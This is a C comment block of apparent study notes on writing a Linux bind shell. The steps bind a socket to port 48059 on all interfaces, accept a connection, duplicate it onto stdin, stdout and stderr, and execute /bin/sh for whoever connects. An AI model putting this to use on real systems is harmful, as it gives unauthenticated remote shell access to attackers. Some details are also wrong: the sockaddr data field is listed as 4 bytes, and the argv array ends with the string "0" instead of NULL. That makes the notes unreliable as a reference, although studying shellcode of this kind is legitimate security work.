/*
   1. setting up socket in C
   	include <sys/socket.h>	//related to socket
	include <netinet/in.h>	//related to sockaddr structure
   2. byte order
   	the byte order of IP network is big-endian.
   3. sockaddr
   	struct sockaddr {
		unsigned short 	sa_family;		//addr family
		char 		sa_data[4];		//addr data
	};

	and sockaddr_in is newer
	struct sockaddr_in {
		short int		sin_family;	//addr family
		unsigned short int	sin_port;	//port number
		struct in_addr		sin_addr;	//internet addr
		unsigned char		sin_zero[8];	//NULL*8, alignment for IP
	};

	internet address is the reverse of IP,
	e.g. 127.0.0.1 -> 0x0100007f
   4. socket
   	a. setup a basic ip socket:
		server = socket (2,1,0) -> AF_INET, ..
	b. setup a sockaddr_in structure
		struct sockaddr_in server_addr;	//store IP/port
		server_addr.sin_addr.s_addr = 0;//set socket addr to 0.0.0.0
		server_addr.sin_port = 0xBBBB;	//set port to 0xBBBB, 48059
		server_addr.sin_family = 2;	//set protocol family : IP
	c. bind port and IP to the socket
		bind (server, (struct sockaddr *)&server_addr, 0x10)
	d. listen to socket
		listen (server, 0)
	e. when someone try to connect, return a handle to client
		client = accept (server, 0, 0)
	f. copy the handle to stdin, stdout, stderr
		dup2(client, 0), dup2(client, 1), dup2(client, 2)
	g. exec shellcode
		char * shell[2];
		shell[0] = "/bin/sh";
		shell[1] = "0";
		execve (shell[0], shell, NULL)
*/


